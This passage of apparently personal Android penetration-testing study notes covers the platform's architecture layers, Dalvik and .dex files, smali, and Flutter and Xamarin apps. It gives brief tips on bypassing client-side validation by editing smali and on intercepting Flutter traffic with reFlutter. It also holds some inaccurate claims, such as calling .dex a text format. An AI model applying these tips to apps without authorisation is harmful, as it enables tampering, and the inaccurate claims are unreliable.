<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Android Pentest - Abdelaziz Elhawary</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="9534581b-85a6-4199-9485-f2e956126666" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">📱</span></div><h1 class="page-title">Android Pentest - Abdelaziz Elhawary</h1><p class="page-description"></p></header><div class="page-body"><h2 id="cd9535fb-fc7f-41be-87fb-6b51ccb8889c" class=""><strong>APK</strong> “<mark class="highlight-yellow">Android Package Kit</mark>”</h2><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Android Architecture</summary><div class="indented"><figure id="7d7d5c04-7cf1-4b08-b42d-fc332b7f269d" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled.png"><img style="width:384px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled.png"/></a></figure><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">                                                                     <mark class="highlight-blue_background">Applications </mark></summary><div class="indented"><p id="e0fa5e37-78dd-4f23-b32e-fe1dafd4289b" class="">Applications is the top layer of android architecture. The <mark class="highlight-blue_background">pre-installed</mark> applications like home, contacts, camera, gallery etc and <mark class="highlight-blue_background">third party applications</mark> downloaded from the play store like chat applications, games etc. will be installed on this layer only.</p><p id="11aaed37-623e-4aff-a7ee-19c3730d8091" class="">It <mark class="highlight-blue_background">runs within the Android run</mark> time <mark class="highlight-blue_background">with the help of the classes and services provided by the application framework</mark>.</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">                                                            <mark class="highlight-blue_background">Application framework </mark></summary><div class="indented"><p id="31a31a05-fff5-4ad8-ba71-0672a5f098ca" class="">Application Framework provides several important classes which are used to create an Android application. It provides a generic abstraction for hardware access and also helps in managing the user interface with application resources. Generally, <mark class="highlight-blue_background">it provides the services </mark>with the help of which we can create a particular class and make that class helpful for the Applications creation.</p><p id="861ede84-7190-4809-8728-d0b37018ab26" class="">It includes different types of services activity manager, notification manager, view system, package manager etc. which are helpful for the development of our application according to the prerequisite.</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">                                                               <mark class="highlight-yellow_background">Application runtime </mark></summary><div class="indented"><p id="3ba7c23d-18fb-4c0c-8a74-74e97732e9a7" class="">Android Runtime environment is one of the most important part of Android. It contains components like core libraries and the Dalvik virtual machine(DVM). Mainly, it provides the base for the application framework and powers our application with the help of the core libraries.</p><ul id="7c6c32df-c47f-49ad-8e46-e0d07b400252" class="bulleted-list"><li style="list-style-type:disc">Like Java Virtual Machine (JVM), <strong>Dalvik Virtual Machine (DVM)</strong> is a register-based virtual machine and specially designed and optimized for android to ensure that a device can run multiple instances efficiently. It depends on the layer Linux kernel for threading and low-level memory management. </li></ul><ul id="1d3f8ee7-91b1-4cdc-8cac-358982df7bc8" class="bulleted-list"><li style="list-style-type:disc">The<mark class="highlight-yellow_background"> core libraries</mark> enable us to implement android applications using the standard <mark class="highlight-yellow_background">JAVA or Kotlin programming languages  as Kotlin is decombiled and understood by the OS as java too</mark>.</li></ul><p id="0b1d435b-481a-4e3d-8b83-32cdbcbee86b" class=""><strong><mark class="highlight-yellow">Android runtime</mark></strong> —&gt; runs every application in a distinct VM</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">                                                                  <mark class="highlight-teal_background">Platform libraries </mark></summary><div class="indented"><p id="370bbcec-1d14-4d73-b30e-ecbb6fd38687" class="">The Platform Libraries (<mark class="highlight-teal_background">Native</mark>)  includes various<span style="border-bottom:0.05em solid"> C/C++ core libraries</span> and <span style="border-bottom:0.05em solid">Java based libraries</span> such as <span style="border-bottom:0.05em solid">Media</span>, <span style="border-bottom:0.05em solid">Graphics</span>, <span style="border-bottom:0.05em solid">Surface Manager</span>, <span style="border-bottom:0.05em solid">OpenGL </span>etc. to provide a support for android development.</p><ul id="d3e79b47-af8e-48e0-8ea0-b48741b89f78" class="bulleted-list"><li style="list-style-type:disc"><strong>Media</strong> library provides support to play and record an audio and video formats.</li></ul><ul id="780df22c-740c-4713-8812-50408f123a16" class="bulleted-list"><li style="list-style-type:disc"><strong>Surface manager</strong> responsible for managing access to the display subsystem.</li></ul><ul id="03161da4-0e0c-4baa-856f-4f9b15660198" class="bulleted-list"><li style="list-style-type:disc"><strong>SGL</strong> and <strong>OpenGL</strong> both cross-language, cross-platform application program interface (API) are used for 2D and 3D computer graphics.</li></ul><ul id="141305f9-7d7e-44b2-96e6-71969df6c96c" class="bulleted-list"><li style="list-style-type:disc"><strong>SQLite</strong> provides database support and <strong>FreeType</strong> provides font support.</li></ul><ul id="d4acf932-5bdc-4f6b-9f37-a9bba20955ce" class="bulleted-list"><li style="list-style-type:disc"><strong>Web-Kit</strong> This open source web browser engine provides all the functionality to display web content and to simplify page loading.</li></ul><ul id="a5e19dda-5ee2-41a9-a773-42950f54abec" class="bulleted-list"><li style="list-style-type:disc"><span style="border-bottom:0.05em solid"><strong>SSL (Secure Sockets Layer)</strong></span><span style="border-bottom:0.05em solid"> is security technology to establish an encrypted link between a web server and a web browser.</span></li></ul><ul id="c073a512-244f-4c5b-a02a-5d17b6a7cabc" class="bulleted-list"><li style="list-style-type:disc"><span style="border-bottom:0.05em solid"><strong><mark class="highlight-teal">libc </mark></strong></span><span style="border-bottom:0.05em solid">—&gt; library for C-developed apps</span></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">                                                                      <mark class="highlight-red_background">Linux Kernel </mark></summary><div class="indented"><p id="d9e5b867-9b5b-446f-a039-f86522743945" class="">Linux Kernel is heart of the android architecture. <mark class="highlight-red_background">It manages all the available drivers</mark> such as display drivers, camera drivers, Bluetooth drivers, audio drivers, memory drivers, etc. which are required during the runtime.</p><p id="025265e8-e5b7-43cb-89a5-fe2549f037f2" class="">The Linux Kernel will provide an <mark class="highlight-red_background">abstraction layer between the device </mark><em><span style="border-bottom:0.05em solid"><strong><mark class="highlight-red_background">hardware </mark></strong></span></em><mark class="highlight-red_background">and the </mark><em><span style="border-bottom:0.05em solid"><strong><mark class="highlight-red_background">other components of android architecture</mark></strong></span></em>. It is responsible for<mark class="highlight-red_background"> management of memory, power, devices etc</mark>.</p><p id="2e0f87ce-71be-453c-8d29-80b5bfb66bd2" class="">The features of Linux kernel are:</p><ul id="ebdb828b-7545-466a-8497-f81aa57bfda4" class="bulleted-list"><li style="list-style-type:disc"><strong>Security:</strong> The Linux kernel handles the security between the application and the system.</li></ul><ul id="41dc534d-a957-4fc1-951c-3b968040fa0c" class="bulleted-list"><li style="list-style-type:disc"><strong>Memory Management:</strong> It efficiently handles the memory management thereby providing the freedom to develop our apps.</li></ul><ul id="cf64203f-5de2-4760-b400-1839bc9fa89b" class="bulleted-list"><li style="list-style-type:disc"><strong>Process Management:</strong> It manages the process well, allocates resources to processes whenever they need them.</li></ul><ul id="8cb0c11e-a1e5-45b8-bc1c-a2a81b2aa03e" class="bulleted-list"><li style="list-style-type:disc"><strong>Network Stack:</strong> It effectively handles the network communication.</li></ul><ul id="da6f55d5-a5f9-42e8-9cbf-6dec6321df69" class="bulleted-list"><li style="list-style-type:disc"><strong>Driver Model:</strong> It ensures that the application works properly on the device and hardware manufacturers responsible for building their drivers into the Linux build.</li></ul></div></details><p id="7d8b27f4-1262-47e8-92e4-75bd9702eea4" class="">
</p><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Dalvik</strong></summary><div class="indented"><ul id="ba658245-9d75-459a-9326-30ba085cd7b4" class="bulleted-list"><li style="list-style-type:disc">On Android, applications are written in<mark class="highlight-yellow"> Java</mark> but run on the<mark class="highlight-yellow"> Dalvik virtual machine.</mark></li></ul><ul id="0abdbc9a-2ebd-4e2c-85b6-60c2f3d211bf" class="bulleted-list"><li style="list-style-type:disc">The <mark class="highlight-pink">Java source code</mark> is <mark class="highlight-pink">compiled </mark>into a different byte format <mark class="highlight-pink">called the Dalvik executable</mark> format, <mark class="highlight-pink">optimized for ARM architecture</mark>. This format helps <em><span style="border-bottom:0.05em solid">conserve resources</span></em> and <em><span style="border-bottom:0.05em solid">battery life</span></em> on mobile devices.</li></ul><ul id="b2a32fa8-b492-488c-b710-dffc7ab55b38" class="bulleted-list"><li style="list-style-type:disc">The Dalvik executable format is represented as an optimized text file format called <mark class="highlight-pink">.dex</mark> . It contains <mark class="highlight-yellow">classes</mark> that are generated from the Java source code in the Dalvik executable format. If needed, the .dex file<mark class="highlight-pink"> can be converted back to a regular java file format by jadx to be read, but to edit you need to edit smali</mark>.</li></ul><ul id="2dcf8435-4179-4b4f-9973-2a767263143e" class="bulleted-list"><li style="list-style-type:disc">One important limitation of the .dex file is that it can only contain <mark class="highlight-yellow">65,535 methods</mark>. If an application exceeds this limit, it will result in multiple .dex files, named classes.dex, classes2.dex, and so on. Libraries, frameworks, and the Android system itself may also lead to multiple .dex files due to the number of methods they contain.</li></ul><figure id="6c25de9f-ccc2-4bab-9b42-b1a23e654eff" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%201.png"><img style="width:240px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%201.png"/></a></figure><blockquote id="53f8f314-cace-4303-af80-63205bc77d72" class="">“<mark class="highlight-blue">ghex</mark>” tool is suitable to disassemble the code sections of the “classes.dex” file, revealing the dalvik executable code (smali code) </blockquote></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">S<strong>mali code</strong></summary><div class="indented"><figure id="8f7d8c92-5b81-4bd4-a108-4b1ec41bea02" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%202.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%202.png"/></a></figure><p id="5ae5fa53-3e6a-40b2-9250-d9e36a77f8d9" class=""><strong>S</strong>mali is an <mark class="highlight-orange">assembly-like programming language</mark> used in Android app development and reverse engineering.<mark class="highlight-blue_background"> It is the output of the Dalvik bytecode decompilation process </mark>and represents <mark class="highlight-blue_background">the low-level code that runs on Android’s Dalvik Virtual Machine (DVM)</mark>, Smali can be considered analogous to <span style="border-bottom:0.05em solid">assembly language, but for Android applications</span>. Both Smali and assembly are low-level, human-readable representations of code that target specific virtual machines or processor architectures.</p><ul id="6954f7a7-a7ab-440f-b19a-99800c44104e" class="bulleted-list"><li style="list-style-type:disc">Could be used to bypass any <mark class="highlight-red_background">client side validations</mark> by editing Smali code</li></ul><ul id="00454225-36e0-41a7-afe6-991c88ed9359" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-red_background">Tests the tamper validations</mark>, as APKs shouldn&#x27;t be working after editing the Smali code and patching it then recompiling “Building” it back</li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Applications with different architecture </summary><div class="indented"><p id="9ad266e8-27d8-4671-a2ac-3767c4d83ea1" class="">both java and kotlin are considered java, as kotlin developed code is translated to be understood by the Dalvik into java too</p><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Flutter applications</summary><div class="indented"><p id="588d712d-84a9-40c4-ac4a-f82d2129fb4c" class="">Also known as (<mark class="highlight-red_background">Non-proxy aware applications</mark>) , they <em><span style="border-bottom:0.05em solid"><strong>dont follow proxy routing and the traffic directed to the server and uses special certificate in such connection</strong></span></em></p><p id="312d63fc-b759-465a-8f77-0333d2851d9d" class=""><mark class="highlight-red_background">to validate if the application is Flutter or not</mark>, by<strong><em><span style="border-bottom:0.05em solid"> jadx-gui check the io folder</span></em></strong>, should contain flutter, io maybe <span style="border-bottom:0.05em solid">obfuscated ⇒ p313</span><code><span style="border-bottom:0.05em solid">io</span></code></p><figure id="ea4be7c9-786f-4a30-8fd8-a7ec6fd04e29" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%203.png"><img style="width:288px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%203.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="9e8f8c47-1add-44cf-883e-e337761e10a4"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">to intercept Flutter based apks ⇒ use reFlutter<p id="bbcd3552-7f19-484e-855c-db28587b4882" class=""><a href="https://github.com/ptswarm/reFlutter">https://github.com/ptswarm/reFlutter</a> </p></div></figure><p id="9cdd0de5-07b7-4d81-a5e0-cc5145933e6f" class="">Also read this:</p><figure id="7af6b62c-b296-41b4-8b21-a59c7c72dc20"><a href="https://hackmd.io/@runicpl/flutter-android" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Pentesting Flutter mobile apps (Android) - HackMD</div><div class="bookmark-description"># Pentesting Flutter mobile apps (Android)  Recently I had an opportunity to perform a penetration t</div></div><div class="bookmark-href"><img src="https://hackmd.io/favicon.png" class="icon bookmark-icon"/>https://hackmd.io/@runicpl/flutter-android</div></div><img src="https://www.gravatar.com/avatar/099e901237eb3fec3cba56be48ef73fc?s=400" class="bookmark-image"/></a></figure></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Xamarin applications</summary><div class="indented"><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="96c22745-b411-43a5-9684-6391d482acb1"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"> you can make <code>.NET</code> APKs using Xamarin, as well as “IOS and Desktop” application.</div></figure><figure id="fa16c528-0e78-48dd-a09b-73d2330cc259" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%204.png"><img style="width:420px" 